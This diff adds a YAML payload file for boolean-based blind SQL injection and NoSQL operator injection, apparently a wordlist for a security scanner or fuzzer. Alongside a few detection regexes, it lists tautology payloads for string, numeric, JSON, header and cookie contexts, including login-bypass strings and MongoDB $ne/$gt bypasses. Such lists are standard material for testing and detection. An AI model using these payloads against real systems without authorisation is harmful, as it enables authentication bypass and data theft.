@@ -1,0 +1,471 @@
+metadata:
+  type: sqli/boolean_based
+  version: "1.0"
+  description: "Boolean-based blind SQL injection payloads"
+  sources: ["OWASP", "SQLMap", "PortSwigger"]
+
+detection_patterns:
+  - "(?i)or\\s+1\\s*=\\s*1"
+  - "(?i)and\\s+1\\s*=\\s*1"
+  - "(?i)or\\s+'1'\\s*=\\s*'1'"
+
+payloads:
+  string:
+    - value: "' OR '1'='1"
+      description: "Classic OR tautology"
+      severity: high
+      tags: [boolean, or]
+
+    - value: "' AND '1'='1"
+      description: "AND tautology true"
+      severity: high
+      tags: [boolean, and]
+
+    - value: "' AND '1'='2"
+      description: "AND tautology false"
+      severity: high
+      tags: [boolean, and]
+
+    - value: "' OR '1'='1' --"
+      description: "OR tautology with comment"
+      severity: high
+      tags: [boolean, or, comment]
+
+    - value: "' AND '1'='1' --"
+      description: "AND tautology with comment"
+      severity: high
+      tags: [boolean, and, comment]
+
+    - value: "' OR 'abc'='abc"
+      description: "OR with string comparison"
+      severity: high
+      tags: [boolean, or]
+
+    - value: "' AND 'abc'='abc"
+      description: "AND with string comparison"
+      severity: high
+      tags: [boolean, and]
+
+    - value: "' AND 'abc'='def"
+      description: "AND false string comparison"
+      severity: high
+      tags: [boolean, and]
+
+    - value: "') OR ('1'='1"
+      description: "Parenthesis OR"
+      severity: high
+      tags: [boolean, or, parenthesis]
+
+    - value: "') AND ('1'='1"
+      description: "Parenthesis AND true"
+      severity: high
+      tags: [boolean, and, parenthesis]
+
+    - value: "') AND ('1'='2"
+      description: "Parenthesis AND false"
+      severity: high
+      tags: [boolean, and, parenthesis]
+
+    - value: "' OR ''='"
+      description: "Empty string tautology"
+      severity: high
+      tags: [boolean, or]
+
+    - value: "' OR 'x'='x"
+      description: "Single char OR"
+      severity: high
+      tags: [boolean, or]
+
+    - value: "' AND 'x'='x"
+      description: "Single char AND true"
+      severity: high
+      tags: [boolean, and]
+
+    - value: "' AND 'x'='y"
+      description: "Single char AND false"
+      severity: high
+      tags: [boolean, and]
+
+    - value: "' OR '1'='1' #"
+      description: "OR with hash comment"
+      severity: high
+      tags: [boolean, or, comment]
+
+    - value: "' AND '1'='1' #"
+      description: "AND with hash comment"
+      severity: high
+      tags: [boolean, and, comment]
+
+    - value: "' OR '1'='1' /*"
+      description: "OR with multiline comment"
+      severity: high
+      tags: [boolean, or, comment]
+
+    - value: "' AND '1'='1' /*"
+      description: "AND with multiline comment"
+      severity: high
+      tags: [boolean, and, comment]
+
+    - value: "' OR 1=1--"
+      description: "Numeric comparison OR"
+      severity: high
+      tags: [boolean, or]
+
+    - value: "' AND 1=1--"
+      description: "Numeric comparison AND true"
+      severity: high
+      tags: [boolean, and]
+
+    - value: "' AND 1=2--"
+      description: "Numeric comparison AND false"
+      severity: high
+      tags: [boolean, and]
+
+    - value: "' OR 'a' LIKE 'a"
+      description: "LIKE tautology"
+      severity: high
+      tags: [boolean, or, like]
+
+    - value: "' AND 'a' LIKE 'a"
+      description: "LIKE AND true"
+      severity: high
+      tags: [boolean, and, like]
+
+    - value: "' AND 'a' LIKE 'b"
+      description: "LIKE AND false"
+      severity: high
+      tags: [boolean, and, like]
+
+    - value: "' OR 'a' BETWEEN 'a' AND 'z"
+      description: "BETWEEN tautology"
+      severity: high
+      tags: [boolean, or, between]
+
+    - value: "' AND 'a' BETWEEN 'a' AND 'z"
+      description: "BETWEEN AND true"
+      severity: high
+      tags: [boolean, and, between]
+
+    - value: "' AND 'a' BETWEEN 'b' AND 'c"
+      description: "BETWEEN AND false"
+      severity: high
+      tags: [boolean, and, between]
+
+  numeric:
+    - value: "1 OR 1=1"
+      description: "Classic numeric OR"
+      severity: high
+      tags: [boolean, or, numeric]
+
+    - value: "1 AND 1=1"
+      description: "Numeric AND true"
+      severity: high
+      tags: [boolean, and, numeric]
+
+    - value: "1 AND 1=2"
+      description: "Numeric AND false"
+      severity: high
+      tags: [boolean, and, numeric]
+
+    - value: "1 OR 1=1 --"
+      description: "Numeric OR with comment"
+      severity: high
+      tags: [boolean, or, numeric, comment]
+
+    - value: "1 AND 1=1 --"
+      description: "Numeric AND true with comment"
+      severity: high
+      tags: [boolean, and, numeric, comment]
+
+    - value: "1 OR TRUE"
+      description: "Boolean TRUE OR"
+      severity: high
+      tags: [boolean, or, numeric]
+
+    - value: "1 AND TRUE"
+      description: "Boolean TRUE AND"
+      severity: high
+      tags: [boolean, and, numeric]
+
+    - value: "1 AND FALSE"
+      description: "Boolean FALSE AND"
+      severity: high
+      tags: [boolean, and, numeric]
+
+    - value: "-1 OR 1=1"
+      description: "Negative ID OR"
+      severity: high
+      tags: [boolean, or, numeric]
+
+    - value: "-1 AND 1=1"
+      description: "Negative ID AND true"
+      severity: high
+      tags: [boolean, and, numeric]
+
+    - value: "-1 AND 1=2"
+      description: "Negative ID AND false"
+      severity: high
+      tags: [boolean, and, numeric]
+
+    - value: "0 OR 1=1"
+      description: "Zero ID OR"
+      severity: high
+      tags: [boolean, or, numeric]
+
+    - value: "0 AND 1=1"
+      description: "Zero ID AND true"
+      severity: high
+      tags: [boolean, and, numeric]
+
+    - value: "1 OR 1>0"
+      description: "Greater than OR"
+      severity: high
+      tags: [boolean, or, numeric]
+
+    - value: "1 AND 1>0"
+      description: "Greater than AND true"
+      severity: high
+      tags: [boolean, and, numeric]
+
+    - value: "1 AND 1<0"
+      description: "Less than AND false"
+      severity: high
+      tags: [boolean, and, numeric]
+
+    - value: "1 OR 1 BETWEEN 0 AND 2"
+      description: "BETWEEN OR"
+      severity: high
+      tags: [boolean, or, numeric, between]
+
+    - value: "1 AND 1 BETWEEN 0 AND 2"
+      description: "BETWEEN AND true"
+      severity: high
+      tags: [boolean, and, numeric, between]
+
+    - value: "1 AND 1 BETWEEN 2 AND 3"
+      description: "BETWEEN AND false"
+      severity: high
+      tags: [boolean, and, numeric, between]
+
+    - value: "1 OR 1 LIKE 1"
+      description: "LIKE OR numeric"
+      severity: high
+      tags: [boolean, or, numeric, like]
+
+    - value: "1 AND 1 LIKE 1"
+      description: "LIKE AND true numeric"
+      severity: high
+      tags: [boolean, and, numeric, like]
+
+    - value: "(1) OR (1)=(1)"
+      description: "Parenthesis numeric OR"
+      severity: high
+      tags: [boolean, or, numeric, parenthesis]
+
+    - value: "(1) AND (1)=(1)"
+      description: "Parenthesis numeric AND"
+      severity: high
+      tags: [boolean, and, numeric, parenthesis]
+
+    - value: "1 OR 2>1"
+      description: "Comparison OR"
+      severity: high
+      tags: [boolean, or, numeric]
+
+    - value: "1 AND 2>1"
+      description: "Comparison AND true"
+      severity: high
+      tags: [boolean, and, numeric]
+
+    - value: "1 AND 2<1"
+      description: "Comparison AND false"
+      severity: high
+      tags: [boolean, and, numeric]
+
+  json:
+    - value: "{\"id\": \"1 OR 1=1\"}"
+      description: "JSON OR tautology"
+      severity: high
+      tags: [boolean, json, or]
+
+    - value: "{\"id\": \"1 AND 1=1\"}"
+      description: "JSON AND true"
+      severity: high
+      tags: [boolean, json, and]
+
+    - value: "{\"id\": \"1 AND 1=2\"}"
+      description: "JSON AND false"
+      severity: high
+      tags: [boolean, json, and]
+
+    - value: "{\"id\": \"' OR '1'='1\"}"
+      description: "JSON string OR"
+      severity: high
+      tags: [boolean, json, or]
+
+    - value: "{\"id\": \"' AND '1'='1\"}"
+      description: "JSON string AND"
+      severity: high
+      tags: [boolean, json, and]
+
+    - value: "{\"id\": 1, \"or\": true}"
+      description: "JSON boolean field"
+      severity: medium
+      tags: [boolean, json]
+
+    - value: "{\"query\": \"1 OR 1=1\"}"
+      description: "JSON query field OR"
+      severity: high
+      tags: [boolean, json, or]
+
+    - value: "{\"search\": \"' OR 1=1--\"}"
+      description: "JSON search injection"
+      severity: high
+      tags: [boolean, json, or]
+
+    - value: "{\"user\": \"admin\", \"pass\": \"' OR '1'='1\"}"
+      description: "JSON auth bypass"
+      severity: critical
+      tags: [boolean, json, auth_bypass]
+
+    - value: "{\"id\": \"$gt: 0\"}"
+      description: "MongoDB operator injection"
+      severity: high
+      tags: [boolean, json, nosql]
+
+    - value: "{\"id\": {\"$gt\": \"\"}}"
+      description: "MongoDB $gt operator"
+      severity: high
+      tags: [boolean, json, nosql]
+
+    - value: "{\"id\": {\"$ne\": null}}"
+      description: "MongoDB $ne operator"
+      severity: high
+      tags: [boolean, json, nosql]
+
+    - value: "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}"
+      description: "MongoDB auth bypass"
+      severity: critical
+      tags: [boolean, json, nosql, auth_bypass]
+
+    - value: "{\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$ne\": \"\"}}"
+      description: "MongoDB regex bypass"
+      severity: critical
+      tags: [boolean, json, nosql, auth_bypass]
+
+  header:
+    - value: "' OR '1'='1"
+      description: "Header injection OR"
+      severity: high
+      tags: [boolean, header, or]
+
+    - value: "' AND '1'='1"
+      description: "Header injection AND true"
+      severity: high
+      tags: [boolean, header, and]
+
+    - value: "127.0.0.1' OR '1'='1"
+      description: "X-Forwarded-For injection"
+      severity: high
+      tags: [boolean, header, xff]
+
+    - value: "127.0.0.1' AND '1'='1"
+      description: "X-Forwarded-For AND"
+      severity: high
+      tags: [boolean, header, xff]
+
+    - value: "' OR 1=1--"
+      description: "User-Agent injection"
+      severity: high
+      tags: [boolean, header, user_agent]
+
+    - value: "admin'--"
+      description: "Referer header injection"
+      severity: high
+      tags: [boolean, header, referer]
+
+    - value: "' OR '1'='1' --"
+      description: "Cookie injection"
+      severity: high
+      tags: [boolean, header, cookie]
+
+    - value: "1' OR '1'='1' --"
+      description: "Cookie numeric bypass"
+      severity: high
+      tags: [boolean, header, cookie]
+
+  generic:
+    - value: "' OR 1=1--"
+      description: "Generic OR tautology"
+      severity: high
+      tags: [boolean, or, polyglot]
+
+    - value: "' AND 1=1--"
+      description: "Generic AND true"
+      severity: high
+      tags: [boolean, and, polyglot]
+
+    - value: "' AND 1=2--"
+      description: "Generic AND false"
+      severity: high
+      tags: [boolean, and, polyglot]
+
+    - value: "1 OR 1=1--"
+      description: "Generic numeric OR"
+      severity: high
+      tags: [boolean, or, numeric, polyglot]
+
+    - value: "1 AND 1=1--"
+      description: "Generic numeric AND true"
+      severity: high
+      tags: [boolean, and, numeric, polyglot]
+
+    - value: "1 AND 1=2--"
+      description: "Generic numeric AND false"
+      severity: high
+      tags: [boolean, and, numeric, polyglot]
+
+    - value: "' OR '1'='1' --"
+      description: "Generic string OR"
+      severity: high
+      tags: [boolean, or, polyglot]
+
+    - value: "' AND '1'='1' --"
+      description: "Generic string AND"
+      severity: high
+      tags: [boolean, and, polyglot]
+
+    - value: "admin' OR '1'='1"
+      description: "Auth bypass OR"
+      severity: critical
+      tags: [boolean, or, auth_bypass, polyglot]
+
+    - value: "admin' AND '1'='1"
+      description: "Auth bypass AND"
+      severity: critical
+      tags: [boolean, and, auth_bypass, polyglot]
+
+    - value: "' OR '1'='1' #"
+      description: "Hash comment OR"
+      severity: high
+      tags: [boolean, or, polyglot]
+
+    - value: "') OR ('1'='1"
+      description: "Parenthesis OR"
+      severity: high
+      tags: [boolean, or, polyglot, parenthesis]
+
+    - value: "') AND ('1'='1"
+      description: "Parenthesis AND"
+      severity: high
+      tags: [boolean, and, polyglot, parenthesis]
+
+    - value: "1 OR 1=1 #"
+      description: "Numeric hash OR"
+      severity: high
+      tags: [boolean, or, numeric, polyglot]
+
+    - value: "'||'1'='1"
+      description: "Concatenation OR"
+      severity: high
+      tags: [boolean, or, polyglot, concatenation]
